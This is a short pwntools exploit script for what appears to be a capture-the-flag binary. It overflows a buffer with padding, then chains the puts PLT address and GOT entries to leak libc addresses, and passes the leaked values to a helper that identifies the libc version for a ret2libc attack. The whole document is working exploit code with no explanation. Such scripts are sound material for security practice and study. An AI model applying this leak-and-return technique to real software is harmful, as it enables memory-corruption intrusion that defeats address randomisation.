from pwn import *

import TheNight

import sys

target = process("./chall-test_localLibcId-encryp19-pwn2")
payload = ""
payload += "00000000000000000000000000000000000000000000"
payload += p32(0x80483e0)
payload += p32(0x80483e0)
payload += p32(0x804a018)
payload += p32(0x804a024)
target.sendline(payload)
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
